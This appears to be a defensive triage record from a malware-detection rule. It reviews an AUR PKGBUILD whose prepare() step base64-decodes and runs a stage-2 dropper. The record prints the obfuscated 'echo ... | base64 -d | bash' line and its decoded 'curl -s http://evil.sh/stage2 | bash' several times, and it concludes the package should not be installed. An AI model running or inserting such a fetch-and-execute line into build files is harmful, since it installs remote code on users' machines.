rules.citation: decoded payloads (runtime-decoded; trust these): curl -s http://evil.sh/stage2 | bash

ioc_entries.provenance: decoded payload in PKGBUILD prepare() (the `echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5zaC9zdGFnZTIgfCBiYXNo' | base64 -d | bash` string decodes to curl against http://evil.sh/stage2)

rules.malicious_reasoning: The runtime-decoded payloads show 'curl -s http://evil.sh/stage2 | bash', a classic stage-2 dropper that downloads and executes from an evil host; the only obfuscation is base64, which the runtime already stripped for us.
rules.reasoning: The base64 payload decodes to an actual `curl ... | bash` command that fetches from evil.sh and pipes to a shell, so it is real malware staging executed at build time, not merely text printed for the reader; the rule is right to surface this.
rules.resolution: The `prepare()` function in the PKGBUILD decodes a Base64 string and pipes it to `bash`, executing `curl -s http://evil.sh/stage2 | bash`. This is a genuine fetch-and-execute payload hidden through Base64 obfuscation, so no change to the recipe is warranted; instead, do not install this package and escalate to the AUR maintainer (Alice).
rules.tp_twin: A `base64 -d` that decodes to a command reaching an external host via curl piped into a shell, e.g. `curl -s http://evil.sh/stage2 | bash`, must keep firing.
